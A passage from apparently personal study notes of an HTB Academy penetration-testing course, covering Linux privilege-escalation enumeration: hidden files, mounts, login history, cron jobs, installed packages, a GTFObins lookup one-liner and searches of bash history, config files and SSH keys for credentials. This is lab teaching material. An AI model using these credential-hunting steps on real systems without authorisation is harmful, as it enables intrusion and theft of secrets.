should check to see if files such as the `.bash_history` file are readable and contain any interesting commands and look for configuration files. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment. Its also important to check for SSH keys for all users, as these could be used to achieve persistence on the system, potentially to escalate privileges, or to assist with pivoting and port forwarding further into the internal network. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls /home\n\nadministrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins\nbackupsvc                cliff.moore  logger       shared\n```\n\nFinally, we can search for any \"low hanging fruit\" such as config files, and other files that may contain sensitive information. Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as .conf and .config, for usernames, passwords, and other secrets.\n\nIf we've gathered any passwords we should try them at this time for all users present on the system. Password re-use is common so we might get lucky!\n\nIn Linux, there are many different places where such files can be stored, including mounted file systems. A mounted file system is a file system that is attached to a particular directory on the system and accessed through that directory. Many file systems, such as ext4, NTFS, and FAT32, can be mounted. Each type of file system has its own benefits and drawbacks. For example, some file systems can only be read by the operating system, while others can be read and written by the user. File systems that can be read and written to by the user are called read/write file systems. Mounting a file system allows the user to access the files and folders stored on that file system. In order to mount a file system, the user must have root privileges. Once a file system is mounted, it can be unmounted by the user with root privileges. We may have access to such file systems and may find sensitive information, documentation, or applications there.\n\n#### Mounted File Systems\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ df -h\n\nFilesystem      Size  Used Avail Use% Mounted on\nudev            1,9G     0  1,9G   0% /dev\ntmpfs           389M  1,8M  388M   1% /run\n/dev/sda5        20G  7,9G   11G  44% /\ntmpfs           1,9G     0  1,9G   0% /dev/shm\ntmpfs           5,0M  4,0K  5,0M   1% /run/lock\ntmpfs           1,9G     0  1,9G   0% /sys/fs/cgroup\n/dev/loop0      128K  128K     0 100% /snap/bare/5\n/dev/loop1       62M   62M     0 100% /snap/core20/1611\n/dev/loop2       92M   92M     0 100% /snap/gtk-common-themes/1535\n/dev/loop4       55M   55M     0 100% /snap/snap-store/558\n/dev/loop3      347M  347M     0 100% /snap/gnome-3-38-2004/115\n/dev/loop5       47M   47M     0 100% /snap/snapd/16292\n/dev/sda1       511M  4,0K  511M   1% /boot/efi\ntmpfs           389M   24K  389M   1% /run/user/1000\n/dev/sr0        3,6G  3,6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64\n/dev/loop6       50M   50M     0 100% /snap/snapd/17576\n/dev/loop7       64M   64M     0 100% /snap/core20/1695\n/dev/loop8       46M   46M     0 100% /snap/snap-store/599\n/dev/loop9      347M  347M     0 100% /snap/gnome-3-38-2004/119\n```\n\nWhen a file system is unmounted, it is no longer accessible by the system. This can be done for various reasons, such as when a disk is removed, or a file system is no longer needed. Another reason may be that files, scripts, documents, and other important information must not be mounted and viewed by a standard user. Therefore, if we can extend our privileges to the `root` user, we could mount and read these file systems ourselves. Unmounted file systems can be viewed as follows:\n\n#### Unmounted File Systems\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/fstab | grep -v \"#\" | column -t\n\nUUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1\nUUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1\n/swapfile                                  none       swap  sw                 0  0\n```\n\nMany folders and files are kept hidden on a Linux system so they are not obvious, and accidental editing is prevented. Why such files and folders are kept hidden, there are many more reasons than those mentioned so far. Nevertheless, we need to be able to locate all hidden files and folders because they can often contain sensitive information, even if we have read-only permissions.\n\n#### All Hidden Files\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -type f -name \".*\" -exec ls -l {} \\; 2>/dev/null | grep htb-student\n\n-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc\n-rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts\n-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history\n-rw-r--r-- 1 htb-student htb-student 807 Nov 27 11:16 /home/htb-student/.profile\n-rw-r--r-- 1 htb-student htb-student 0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful\n-rw-r--r-- 1 htb-student htb-student 220 Nov 27 11:16 /home/htb-student/.bash_logout\n-rw-rw-r-- 1 htb-student htb-student 162 Nov 28 13:26 /home/htb-student/.notes\n```\n\n#### All Hidden Directories\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -type d -name \".*\" -ls 2>/dev/null\n\n   684822      4 drwx------   3 htb-student htb-student     4096 Nov 28 12:32 /home/htb-student/.gnupg\n   790793      4 drwx------   2 htb-student htb-student     4096 Okt 27 11:31 /home/htb-student/.ssh\n   684804      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.cache\n   790827      4 drwxrwxr-x   8 htb-student htb-student     4096 Okt 27 11:32 /home/htb-student/CVE-2021-3156/.git\n   684796      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.config\n   655426      4 drwxr-xr-x   3 htb-student htb-student     4096 Okt 27 11:19 /home/htb-student/.local\n   524808      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.cache\n   544027      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.config\n   544028      4 drwxr-xr-x   3 gdm         gdm             4096 Aug 31 08:54 /var/lib/gdm3/.local\n   524938      4 drwx------   2 colord      colord          4096 Okt 27 11:19 /var/lib/colord/.cache\n     1408      2 dr-xr-xr-x   1 htb-student htb-student     2048 Aug 31 09:17 /media/htb-student/Ubuntu\\ 20.04.5\\ LTS\\ amd64/.disk\n   280101      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.font-unix\n   262364      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.ICE-unix\n   262362      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.X11-unix\n   280103      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.Test-unix\n   262830      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.XIM-unix\n   661820      4 drwxr-xr-x   5 root        root            4096 Aug 31 08:55 /usr/lib/modules/5.15.0-46-generic/vdso/.build-id\n   666709      4 drwxr-xr-x   5 root        root            4096 Okt 27 11:18 /usr/lib/modules/5.15.0-52-generic/vdso/.build-id\n   657527      4 drwxr-xr-x 170 root        root            4096 Aug 31 08:55 /usr/lib/debug/.build-id\n```\n\nIn addition, three default folders are intended for temporary files. These folders are visible to all users and can be read. In addition, temporary logs or script output can be found there. Both `/tmp` and `/var/tmp` are used to store data temporarily. However, the key difference is how long the data is stored in these file systems. The data retention time for `/var/tmp` is much longer than that of the `/tmp` directory. By default, all files and data stored in /var/tmp are retained for up to 30 days. In /tmp, on the other hand, the data is automatically deleted after ten days.\n\nIn addition, all temporary files stored in the `/tmp` directory are deleted immediately when the system is restarted. Therefore, the `/var/tmp` directory is used by programs to store data that must be kept between reboots temporarily.\n\n#### Temporary Files\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm\n\n/dev/shm:\ntotal 0\n\n/tmp:\ntotal 52\n-rw------- 1 htb-student htb-student    0 Nov 28 12:32 config-err-v8LfEU\ndrwx------ 3 root        root        4096 Nov 28 12:37 snap.snap-store\ndrwx------ 2 htb-student htb-student 4096 Nov 28 12:32 ssh-OKlLKjlc98xh\n<SNIP>\ndrwx------ 2 htb-student htb-student 4096 Nov 28 12:37 tracker-extract-files.1000\ndrwx------ 2 gdm         gdm         4096 Nov 28 12:31 tracker-extract-files.125\n\n/var/tmp:\ntotal 28\ndrwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi\ndrwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-ModemManager.service-4Rej9e\n...SNIP...\n```\n\n---\n\n## Moving On\n\nWe've gotten an initial lay of the land and (hopefully) some sensitive or useful data points that can help us on our way to escalating privileges or even moving laterally in the internal network. Next we'll turn our focus to permissions and check to see what directories, scripts, binaries, etc we can read and write to with our current user privileges.\n\nThough we are focusing on manual enumeration in this module, its worth running the [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script at this point in a real-world assessment so we have as much data to dig through as possible. Oftentimes we can find an easy win but having this output handy can sometimes uncover nuanced issues that our manual enumeration missed. We should, though, practice our manual enumeration as much as possible and create (and continue to add to) our own cheat sheet of key commands (and alternatives for different Linux operating systems). We'll start to develop our own style, command preference, and even see some areas that we can begin to script out ourselves. Tools are great and have their place but where many fall short is being able to perform a given task when a tool fails or we cannot get it onto the system.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/04-Linux Services & Internals Enumeration",
    "path": "02_CPTS/16-Linux Privilege Escalation/04-Linux Services & Internals Enumeration.md",
    "title": "04 Linux Services & Internals Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Now that we've dug into the environment and gotten the lay of the land and uncovered as much as possible about our user and group permissions as they relate to files, scripts, binaries, directorie...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nNow that we've dug into the environment and gotten the lay of the land and uncovered as much as possible about our user and group permissions as they relate to files, scripts, binaries, directories, etc., we'll take things one step further and look deeper into the internals of the host operating system. In this phase we will enumerate the following which will help to inform many of the attacks discussed in the later sections of this module.\n\n- What services and applications are installed?\n    \n- What services are running?\n    \n- What sockets are in use?\n    \n- What users, admins, and groups exist on the system?\n    \n- Who is current logged in? What users recently logged in?\n    \n- What password policies, if any, are enforced on the host?\n    \n- Is the host joined to an Active Directory domain?\n    \n- What types of interesting information can we find in history, log, and backup files\n    \n- Which files have been modified recently and how often? Are there any interesting patterns in file modification that could indicate a cron job in use that we may be able to hijack?\n    \n- Current IP addressing information\n    \n- Anything interesting in the `/etc/hosts` file?\n    \n- Are there any interesting network connections to other systems in the internal network or even outside the network?\n    \n- What tools are installed on the system that we may be able to take advantage of? (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc, etc.)\n    \n- Can we access the `bash_history` file for any users and can we uncover any thing interesting from their recorded command line history such as passwords?\n    \n- Are any Cron jobs running on the system that we may be able to hijack?\n    \n\nAt this time we'll also want to gather as much network information as possible. What is our current IP address? Does the system have any other interfaces and, hence, could possibly be used to pivot into another subnet that was previously unreachable from our attack host? We do this with the `ip a` command or `ifconfig`, but this command will sometimes not work on certain systems if the [net-tools](https://packages.ubuntu.com/search?keywords=net-tools) package is not present.\n\n---\n\n## Internals\n\nWhen we talk about the `internals`, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks. So we start with the interfaces through which our target system can communicate.\n\n#### Network Interfaces\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ ip a\n\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:b9:ed:2a brd ff:ff:ff:ff:ff:ff\n    inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192\n       valid_lft 3092sec preferred_lft 3092sec\n    inet6 dead:beef::250:56ff:feb9:ed2a/64 scope global dynamic mngtmpaddr \n       valid_lft 86400sec preferred_lft 14400sec\n    inet6 fe80::250:56ff:feb9:ed2a/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\nIs there anything interesting in the `/etc/hosts` file?\n\n#### Hosts\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/hosts\n\n127.0.0.1 localhost\n127.0.1.1 nixlpe02\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n```\n\nIt can also be helpful to check out each user's last login time to try to see when users typically log in to the system and how frequently. This can give us an idea of how widely used this system is which can open up the potential for more misconfigurations or \"messy\" directories or command histories.\n\n#### User's Last Login\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ lastlog\n\nUsername         Port     From             Latest\nroot                                       **Never logged in**\ndaemon                                     **Never logged in**\nbin                                        **Never logged in**\nsys                                        **Never logged in**\nsync                                       **Never logged in**\n...SNIP...\nsystemd-coredump                           **Never logged in**\nmrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022\nlxd                                        **Never logged in**\nbjones                                     **Never logged in**\nadministrator.ilfreight                           **Never logged in**\nbackupsvc                                  **Never logged in**\ncliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022\nlogger                                     **Never logged in**\nshared                                     **Never logged in**\nstacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022\nhtb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022                          \n```\n\nIn addition, let's see if anyone else is currently on the system with us. There are a few ways to do this, such as the `who` command. The `finger` command will work to display this information on some Linux systems. We can see that the `cliff.moore` user is logged in to the system with us.\n\n#### Logged In Users\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ w\n\n 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\ncliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash\n```\n\nIt is also important to check a user's bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.\n\n#### Command History\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ history\n\n    1  id\n    2  cd /home/cliff.moore\n    3  exit\n    4  touch backup.sh\n    5  tail /var/log/apache2/error.log\n    6  ssh ec2-user@dmz02.inlanefreight.local\n    7  history\n```\n\nSometimes we can also find special history files created by scripts or programs. This can be found, among others, in scripts that monitor certain activities of users and check for suspicious activities.\n\n#### Finding History Files\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -type f \\( -name *_hist -o -name *_history \\) -exec ls -l {} \\; 2>/dev/null\n\n-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history\n```\n\nIt's also a good idea to check for any cron jobs on the system. Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.\n\n#### Cron\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -la /etc/cron.daily/\n\ntotal 48\ndrwxr-xr-x  2 root root 4096 Aug  2 17:36 .\ndrwxr-xr-x 96 root root 4096 Aug  2 19:34 ..\n-rwxr-xr-x  1 root root  376 Dec  4  2019 apport\n-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat\n-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils\n-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg\n-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate\n-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db\n-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder\n-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest\n-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common\n```\n\nThe [proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) (`proc` / `procfs`) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.\n\n#### Proc\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ find /proc -name cmdline -exec cat {} \\; 2>/dev/null | tr \" \" \"\\n\"\n\n...SNIP...\nstartups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:\nhtb-student\n[priv]sshd:\nhtb-student\n[priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:\nhtb-student@pts/2sshd:\n```\n\n---\n\n## Services\n\nIf it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.\n\n#### Installed Packages\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ apt list --installed | tr \"/\" \" \" | cut -d\" \" -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list\n\nListing...                                                 \naccountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          \naccountsservice 0.6.55-0ubuntu12~20.04.5                   \nacl 2.2.53-6                                               \nacpi-support 0.143                                         \nacpid 2.0.32-1ubuntu1                                      \nadduser 3.118ubuntu2                                       \nadwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 \nalsa-base 1.0.25+dfsg-0ubuntu5                             \nalsa-topology-conf 1.2.2-1                                                                                            \nalsa-ucm-conf 1.2.2-1ubuntu0.13                            \nalsa-utils 1.2.2-1ubuntu2.1                                                                                           \namd64-microcode 3.20191218.1ubuntu1\nanacron 2.3-29\napg 2.2.3.dfsg.1-5\napp-install-data-partner 19.04\napparmor 2.13.3-7ubuntu5.1\napport-gtk 2.20.11-0ubuntu27.24\napport-symptoms 0.23\napport 2.20.11-0ubuntu27.24\nappstream 0.12.10-2\napt-config-icons-hidpi 0.12.10-2\napt-config-icons 0.12.10-2\napt-utils 2.0.9\n...SNIP...\n```\n\nIt's also a good idea to check if the `sudo` version installed on the system is vulnerable to any legacy or recent exploits.\n\n#### Sudo Version\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo -V\n\nSudo version 1.8.31\nSudoers policy plugin version 1.8.31\nSudoers file grammar version 46\nSudoers I/O plugin version 1.8.31\n```\n\nOccasionally it can also happen that no direct packages are installed on the system but compiled programs in the form of binaries. These do not require installation and can be executed directly by the system itself.\n\n#### Binaries\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/\n\nlrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -> usr/bin\n\n/usr/bin/:\ntotal 175160\n-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled\n-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec\n-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect\n-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen\n-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository\n-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpart\nlrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -> x86_64-linux-gnu-addr2line\n...SNIP...\n\n/usr/sbin/:\ntotal 32500\n-rwxr-xr-x 1 root root      3068 Mai 19  2020 aa-remove-unknown\n-rwxr-xr-x 1 root root      8839 Mai 19  2020 aa-status\n-rwxr-xr-x 1 root root       139 Jun 18  2019 aa-teardown\n-rwxr-xr-x 1 root root     14728 Feb 25  2020 accessdb\n-rwxr-xr-x 1 root root     60432 Nov 28  2019 acpid\n-rwxr-xr-x 1 root root      3075 Jul  4 18:20 addgnupghome\nlrwxrwxrwx 1 root root         7 Okt 27 11:14 addgroup -> adduser\n-rwxr-xr-x 1 root root       860 Dez  7  2019 add-shell\n-rwxr-xr-x 1 root root     37785 Apr 16  2020 adduser\n-rwxr-xr-x 1 root root     69000 Feb  7  2022 agetty\n-rwxr-xr-x 1 root root      5576 Jul 31  2015 alsa\n-rwxr-xr-x 1 root root      4136 Apr 14  2021 alsabat-test\n-rwxr-xr-x 1 root root    118176 Apr 14  2021 alsactl\n-rwxr-xr-x 1 root root     26489 Apr 14  2021 alsa-info\n-rwxr-xr-x 1 root root     39088 Jul 16  2019 anacron\n...SNIP...\n```\n\n[GTFObins](https://gtfobins.github.io) provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. With the next oneliner, we can compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.\n\n#### GTFObins\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d\" \" -f1 | sed '/^[[:space:]]*$/d');do if grep -q \"$i\" installed_pkgs.list;then echo \"Check GTFO for: $i\";fi;done\n\nCheck GTFO for: ab                                         \nCheck GTFO for: apt                                        \nCheck GTFO for: ar                                         \nCheck GTFO for: as         \nCheck GTFO for: ash                                        \nCheck GTFO for: aspell                                     \nCheck GTFO for: at     \nCheck GTFO for: awk      \nCheck GTFO for: bash                                       \nCheck GTFO for: bridge\nCheck GTFO for: busybox\nCheck GTFO for: bzip2\nCheck GTFO for: cat\nCheck GTFO for: comm\nCheck GTFO for: cp\nCheck GTFO for: cpio\nCheck GTFO for: cupsfilter\nCheck GTFO for: curl\nCheck GTFO for: dash\nCheck GTFO for: date\nCheck GTFO for: dd\nCheck GTFO for: diff\n```\n\nWe can use the diagnostic tool `strace` on Linux-based operating systems to track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system. In addition, we can also use the tool to monitor security-related activities and identify potential attack vectors, such as specific requests to remote hosts using passwords or tokens.\n\nThe output of `strace` can be written to a file for later analysis, and it provides a wealth of options that allow detailed monitoring of the program's behavior.\n\n#### Trace System Calls\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ strace ping -c1 10.129.112.20\n\nexecve(\"/usr/bin/ping\", [\"ping\", \"-c1\", \"10.129.112.20\"], 0x7ffdc8b96cc0 /* 80 vars */) = 0\naccess(\"/etc/suid-debug\", F_OK)         = -1 ENOENT (No such file or directory)\nbrk(NULL)                               = 0x56222584c000\narch_prctl(0x3001 /* ARCH_??? */, 0x7fffb0b2ea00) = -1 EINVAL (Invalid argument)\n...SNIP...\naccess(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)\n...SNIP...\nopenat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libidn2.so.0\", O_RDONLY|O_CLOEXEC) = 3\n...SNIP...\nread(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0P\\237\\2\\0\\0\\0\\0\\0\"..., 832) = 832\npread64(3, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784\npread64(3, \"\\4\\0\\0\\0 \\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0\"..., 48, 848) = 48\n...SNIP...\nsocket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3\nsocket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4\ncapget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, NULL) = 0\ncapget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=0, permitted=0, inheritable=0}) = 0\nopenat(AT_FDCWD, \"/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache\", O_RDONLY) = 5\n...SNIP...\nsocket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5\nconnect(5, {sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr(\"10.129.112.20\")}, 16) = 0\ngetsockname(5, {sa_family=AF_INET, sin_port=htons(39885), sin_addr=inet_addr(\"10.129.112.20\")}, [16]) = 0\nclose(5)                                = 0\n...SNIP...\nsendto(3, \"\\10\\0\\31\\303\\0\\0\\0\\1eX\\327c\\0\\0\\0\\0\\330\\254\\n\\0\\0\\0\\0\\0\\20\\21\\22\\23\\24\\25\\26\\27\"..., 64, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(\"10.129.112.20\")}, 16) = 64\n...SNIP...\nrecvmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(\"10.129.112.20\")}, msg_namelen=128 => 16, msg_iov=[{iov_base=\"\\0\\0!\\300\\0\\3\\0\\1eX\\327c\\0\\0\\0\\0\\330\\254\\n\\0\\0\\0\\0\\0\\20\\21\\22\\23\\24\\25\\26\\27\"..., iov_len=192}], msg_iovlen=1, msg_control=[{cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SO_TIMESTAMP_OLD, cmsg_data={tv_sec=1675057253, tv_usec=699895}}, {cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[64]}], msg_controllen=56, msg_flags=0}, 0) = 64\nwrite(1, \"64 bytes from 10.129.112.20: icmp_se\"..., 57) = 57\nwrite(1, \"\\n\", 1)                       = 1\nwrite(1, \"--- 10.129.112.20 ping statistics --\"..., 34) = 34\nwrite(1, \"1 packets transmitted, 1 receive\"..., 60) = 60\nwrite(1, \"rtt min/avg/max/mdev = 0.287/0.2\"..., 50) = 50\nclose(1)                                = 0\nclose(2)                                = 0\nexit_group(0)                           = ?\n+++ exited with 0 +++\n```\n\nUsers can read almost all configuration files on a Linux operating system if the administrator has kept them the same. These configuration files can often reveal how the service is set up and configured to understand better how we can use it for our purposes. In addition, these files can contain sensitive information, such as keys and paths to files in folders that we cannot see. However, if the file has read permissions for everyone, we can still read the file even if we do not have permission to read the folder.\n\n#### Configuration Files\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -type f \\( -name *.conf -o -name *.config \\) -exec ls -l {} \\; 2>/dev/null\n\n-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf\n-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf\n-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf\n-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf\n-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf\n-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf\n...SNIP...\n```\n\nThe scripts are similar to the configuration files. Often administrators are lazy and convinced of network security and neglect the internal security of their systems. These scripts, in some cases, have such wrong privileges that we will deal with later, but the contents are of great importance even without these privileges. Because through them, we can discover internal and individual processes that can be of great use to us.\n\n#### Scripts\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -type f -name \"*.sh\" 2>/dev/null | grep -v \"src\\|snap\\|share\"\n\n/home/htb-student/automation.sh\n/etc/wpa_supplicant/action_wpa.sh\n/etc/wpa_supplicant/ifupdown.sh\n/etc/wpa_supplicant/functions.sh\n/etc/init.d/keyboard-setup.sh\n/etc/init.d/console-setup.sh\n/etc/init.d/hwclock.sh\n...SNIP...\n```\n\nAlso, if we look at the process list, it can give us information about which scripts or binaries are in use and by which user. So, for example, if it is a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the `root` directory.\n\n#### Running Services by User\n\nLinux Services & Internals Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ ps aux | grep root\n\n...SNIP...\nroot           1  2.0  0.2 168196 11364 ?        Ss   12:31   0:01 /sbin/init splash\nroot         378  0.5  0.4  62648 17212 ?        S<s  12:31   0:00 /lib/systemd/systemd-journald\nroot         409  0.8  0.1  25208  7832 ?        Ss   12:31   0:00 /lib/systemd/systemd-udevd\nroot         457  0.0  0.0 150668   284 ?        Ssl  12:31   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid\nroot         752  0.0  0.2  58780 10608 ?        Ss   12:31   0:00 /usr/bin/VGAuthService\nroot         755  0.0  0.1 248088  7448 ?        Ssl  12:31   0:00 /usr/bin/vmtoolsd\nroot         772  0.0  0.2 250528  9388 ?        Ssl  12:31   0:00 /usr/lib/accountsservice/accounts-daemon\nroot         773  0.0  0.0   2548   768 ?        Ss   12:31   0:00 /usr/sbin/acpid\nroot         774  0.0  0.0  16720   708 ?        Ss   12:31   0:00 /usr/sbin/anacron -d -q -s\nroot         778  0.0  0.0  18052  2992 ?        Ss   12:31   0:00 /usr/sbin/cron -f\nroot         779  0.0  0.2  37204  8964 ?        Ss   12:31   0:00 /usr/sbin/cupsd -l\nroot         784  0.4  0.5 273512 